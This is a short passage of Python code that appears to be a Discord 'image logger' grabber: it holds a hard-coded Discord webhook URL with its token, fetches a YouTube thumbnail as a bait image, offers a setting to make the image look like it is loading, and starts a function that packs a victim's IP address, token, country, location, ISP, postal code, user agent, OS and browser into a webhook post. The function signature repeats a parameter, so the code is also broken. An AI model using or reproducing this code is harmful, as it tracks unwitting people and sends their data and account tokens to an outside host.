...
webhook = 'https://discord.com/api/webhooks/1063770411323629578/Ztj8ZApf8AWWwCVaySlQX9P2n1L0_-zWI2gnkpQoAm3ZDeNdkowauPp77z9Ur6CeMCZa'
bindata = requests.get('https://i.ytimg.com/vi/froV-FcSQjc/maxresdefault.jpg').content

buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)

def formatHook(ip,token,token,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
